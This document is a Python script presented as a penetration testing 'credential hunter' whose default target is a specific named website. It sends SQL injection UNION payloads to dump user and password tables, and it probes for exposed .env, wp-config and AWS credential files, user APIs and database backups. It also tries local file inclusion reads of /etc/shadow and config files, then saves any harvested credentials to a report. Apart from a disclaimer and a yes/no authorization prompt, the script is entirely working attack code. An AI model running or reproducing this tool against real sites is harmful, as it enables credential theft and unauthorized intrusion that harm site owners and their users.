#!/usr/bin/env python3
"""
Yamersal Credential Hunter
Advanced Credential Extraction Tool for Penetration Testing
Author: Security Researcher
Version: 2.1
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class CredentialHunter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target
        self.session = requests.Session()
        self.credentials_found = []
        self.vulnerable_endpoints = []
        
        # Configure session headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_connection(self):
        """Test if target is accessible"""
        try:
            response = self.session.get(self.target, timeout=10)
            if response.status_code == 200:
                self.print_status(f"Target is accessible: {self.target}", "SUCCESS")
                return True
            else:
                self.print_status(f"Target responded with status: {response.status_code}", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"Target is not accessible: {e}", "ERROR")
            return False

    def extract_from_sql_injection(self):
        """Extract credentials using SQL Injection"""
        self.print_status("Attempting SQL Injection credential extraction...", "INFO")
        
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users WHERE user_login='admin'--",
            "' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT username,password,email FROM admin_users--",
            "' UNION SELECT username,password,email FROM administrators--",
            "' UNION SELECT version(),database(),user()--"
        ]
        
        parameters = ['id', 'user', 'account', 'page', 'view', 'product_id', 'order_id']
        
        for param in parameters:
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        patterns = {
                            'username': r'admin|user|username',
                            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                            'hash': r'\$2[ayb]\$[0-9]{2}\$[A-Za-z0-9./]{53}',
                            'md5': r'[a-fA-F0-9]{32}'
                        }
                        
                        for key, pattern in patterns.items():
                            matches = re.findall(pattern, response.text, re.IGNORECASE)
                            for match in matches:
                                if len(match) > 3:
                                    self.credentials_found.append({
                                        'type': 'SQL_INJECTION',
                                        'parameter': param,
                                        'data_type': key,
                                        'value': match,
                                        'payload': payload
                                    })
                                    self.print_status(f"SQLi {key} found: {match}", "SUCCESS")
                except Exception as e:
                    continue

    def extract_from_config_files(self):
        """Extract credentials from exposed configuration files"""
        self.print_status("Scanning for exposed configuration files...", "INFO")
        
        config_files = [
            '/.env',
            '/wp-config.php', 
            '/config.php',
            '/configuration.ini',
            '/app/config.py',
            '/application/config/database.php',
            '/includes/config.php',
            '/.aws/credentials',
            '/web.config',
            '/appsettings.json'
        ]
        
        for config_file in config_files:
            try:
                response = self.session.get(f"{self.target}{config_file}", timeout=8)
                if response.status_code == 200:
                    content = response.text
                    
                    db_patterns = {
                        'DB_USER': r"DB_USERNAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]", 
                        'DB_NAME': r"DB_NAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_HOST': r"DB_HOST['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]"
                    }
                    
                    api_patterns = {
                        'API_KEY': r"API_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'SECRET_KEY': r"SECRET_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'ACCESS_TOKEN': r"ACCESS_TOKEN['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]"
                    }
                    
                    for key, pattern in {**db_patterns, **api_patterns}.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if match:
                                self.credentials_found.append({
                                    'type': 'CONFIG_FILE',
                                    'file': config_file,
                                    'key': key, 
                                    'value': match
                                })
                                self.print_status(f"Config {key} found: {match}", "SUCCESS")
            except Exception as e:
                continue

    def extract_from_exposed_apis(self):
        """Extract credentials from exposed API endpoints"""
        self.print_status("Scanning exposed API endpoints for credentials...", "INFO")
        
        api_endpoints = [
            '/wp-json/wp/v2/users',
            '/api/users',
            '/api/admin/list', 
            '/api/auth/users',
            '/admin/api/accounts',
            '/api/account/list',
            '/rest-api/users',
            '/graphql'
        ]
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=8)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        self.parse_api_response(data, endpoint)
                    except:
                        self.parse_text_response(response.text, endpoint)
            except Exception as e:
                continue

    def parse_api_response(self, data, endpoint):
        """Parse JSON API response for credentials"""
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    self.extract_user_credentials(item, endpoint)
        elif isinstance(data, dict):
            self.extract_user_credentials(data, endpoint)

    def parse_text_response(self, text, endpoint):
        """Parse text response for credentials"""
        user_patterns = [
            r'"username":\s*"([^"]+)"',
            r'"email":\s*"([^"]+)"', 
            r'"user_login":\s*"([^"]+)"',
            r'"name":\s*"([^"]+)"'
        ]
        
        for pattern in user_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if match:
                    self.credentials_found.append({
                        'type': 'EXPOSED_API',
                        'endpoint': endpoint,
                        'data_type': 'username',
                        'value': match
                    })
                    self.print_status(f"API username found: {match}", "SUCCESS")

    def extract_user_credentials(self, user_data, endpoint):
        """Extract user credentials from user data object"""
        username = user_data.get('username') or user_data.get('user_login') or user_data.get('email')
        password = user_data.get('password') or user_data.get('user_pass')
        email = user_data.get('email')
        
        if username:
            self.credentials_found.append({
                'type': 'EXPOSED_API',
                'endpoint': endpoint,
                'data_type': 'username',
                'value': username
            })
            self.print_status(f"API username found: {username}", "SUCCESS")
            
        if password:
            self.credentials_found.append({
                'type': 'EXPOSED_API', 
                'endpoint': endpoint,
                'data_type': 'password',
                'value': password
            })
            self.print_status(f"API password found: {password}", "CRITICAL")
            
        if email:
            self.credentials_found.append({
                'type': 'EXPOSED_API',
                'endpoint': endpoint, 
                'data_type': 'email',
                'value': email
            })
            self.print_status(f"API email found: {email}", "SUCCESS")

    def extract_from_backup_files(self):
        """Extract credentials from backup files"""
        self.print_status("Searching for backup files...", "INFO")
        
        backup_files = [
            '/backup.zip',
            '/dump.sql',
            '/database.sql',
            '/backup.sql',
            '/backup.tar.gz',
            '/www.zip',
            '/site_backup.sql'
        ]
        
        for backup_file in backup_files:
            try:
                response = self.session.get(f"{self.target}{backup_file}", timeout=10)
                if response.status_code == 200:
                    content = response.text
                    
                    insert_patterns = [
                        r"INSERT INTO [`\"']?users?[`\"']?[^;]*VALUES[^;]*\([^)]*['\"]([^'\"]+)['\"][^)]*['\"]([^'\"]+)['\"]",
                        r"username['\"]?\s*=>?\s*['\"]([^'\"]+)['\"][^>]*password['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]"
                    ]
                    
                    for pattern in insert_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if len(match) == 2:
                                username, password = match
                                self.credentials_found.append({
                                    'type': 'BACKUP_FILE',
                                    'file': backup_file,
                                    'username': username,
                                    'password': password
                                })
                                self.print_status(f"Backup credentials: {username} / {password}", "CRITICAL")
            except Exception as e:
                continue

    def extract_from_lfi(self):
        """Extract credentials via LFI vulnerabilities"""
        self.print_status("Attempting LFI credential extraction...", "INFO")
        
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '../../wp-config.php',
            '../../../database.php',
            '/var/www/html/.env',
            '/var/www/html/config.php'
        ]
        
        parameters = ['file', 'path', 'load', 'page', 'view']
        
        for param in parameters:
            for file_path in sensitive_files:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(file_path)}"
                    response = self.session.get(test_url, timeout=8)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        if 'wp-config' in file_path:
                            db_user = re.search(r"DB_USER',\s*'([^']+)", content)
                            db_pass = re.search(r"DB_PASSWORD',\s*'([^']+)", content)
                            
                            if db_user and db_pass:
                                self.credentials_found.append({
                                    'type': 'LFI_WP_CONFIG',
                                    'file': file_path,
                                    'db_user': db_user.group(1),
                                    'db_password': db_pass.group(1)
                                })
                                self.print_status(f"LFI DB credentials: {db_user.group(1)} / {db_pass.group(1)}", "CRITICAL")
                except Exception as e:
                    continue

    def run_comprehensive_scan(self):
        """Run all credential extraction methods"""
        self.print_status("Starting comprehensive credential extraction scan...", "CRITICAL")
        
        if not self.test_connection():
            return
        
        methods = [
            self.extract_from_sql_injection,
            self.extract_from_config_files,
            self.extract_from_exposed_apis,
            self.extract_from_backup_files,
            self.extract_from_lfi
        ]
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            for method in methods:
                executor.submit(method)
        
        self.print_status("Comprehensive scan completed", "SUCCESS")
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive credential report"""
        if not self.credentials_found:
            self.print_status("No credentials found during scan", "WARNING")
            return
        
        print("\n" + "="*80)
        print("CREDENTIAL EXTRACTION REPORT")
        print("="*80)
        print(f"Target: {self.target}")
        print(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Credentials Found: {len(self.credentials_found)}")
        print("\n" + "-"*80)
        
        by_type = {}
        for cred in self.credentials_found:
            cred_type = cred['type']
            if cred_type not in by_type:
                by_type[cred_type] = []
            by_type[cred_type].append(cred)
        
        for cred_type, credentials in by_type.items():
            print(f"\n{cred_type.replace('_', ' ').title()}:")
            print("-" * 40)
            for cred in credentials:
                if 'username' in cred and 'password' in cred:
                    print(f"  Username: {cred['username']} : Password: {cred['password']}")
                elif 'db_user' in cred and 'db_password' in cred:
                    print(f"  DB User: {cred['db_user']} : DB Password: {cred['db_password']}")
                elif 'key' in cred and 'value' in cred:
                    print(f"  {cred['key']}: {cred['value']}")
                elif 'data_type' in cred and 'value' in cred:
                    print(f"  {cred['data_type']}: {cred['value']}")
        
        self.save_detailed_report()

    def save_detailed_report(self):
        """Save detailed report to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"credential_hunter_report_{timestamp}.json"
        
        report = {
            'target': self.target,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'credentials_found': self.credentials_found,
            'summary': {
                'total_credentials': len(self.credentials_found),
                'credential_types': list(set([c['type'] for c in self.credentials_found]))
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
            self.print_status(f"Detailed report saved to: {filename}", "SUCCESS")
        except Exception as e:
            self.print_status(f"Failed to save report: {e}", "ERROR")

def main():
    """Main function"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         CREDENTIAL HUNTER v2.1                              ║
║                   Advanced Credential Extraction Tool                       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter target URL (default: https://yamersal.com): ").strip()
        if not target:
            target = "https://yamersal.com"
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\nLEGAL DISCLAIMER: This tool is for authorized penetration testing only!")
    print(f"Unauthorized use may be illegal in your jurisdiction!")
    print(f"Use only on systems you own or have explicit permission to test!\n")
    
    confirm = input("Do you have authorization to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled. Exiting...")
        sys.exit(0)
    
    try:
        hunter = CredentialHunter(target)
        hunter.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"\nScan failed with error: {e}")

if __name__ == "__main__":
    main()